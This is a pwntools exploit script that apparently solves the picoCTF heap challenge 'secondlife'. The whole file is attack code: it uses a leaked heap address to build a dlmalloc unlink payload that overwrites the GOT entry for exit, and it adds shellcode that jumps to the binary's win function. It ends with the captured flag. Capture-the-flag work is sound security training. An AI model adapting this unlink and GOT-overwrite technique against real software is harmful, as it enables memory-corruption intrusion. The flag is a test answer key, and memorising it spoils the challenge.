from pwn import *

elf = ELF('./secondlife')

p = process('./secondlife')

p.recvuntil('decimal...\n')
leak = int(p.recvline()[:-1])

p.sendline('lola')

fd = leak+8
bk = elf.got['exit'] - 8

payload = p32(fd) + p32(bk) + asm('mov eax,0x{:x}\njmp eax'.format(elf.symbols['win']))

p.sendlineafter('useful...\n',payload)


p.interactive()

# dl malloc unlink
# picoCTF{HeapHeapFlag_bf76a90f}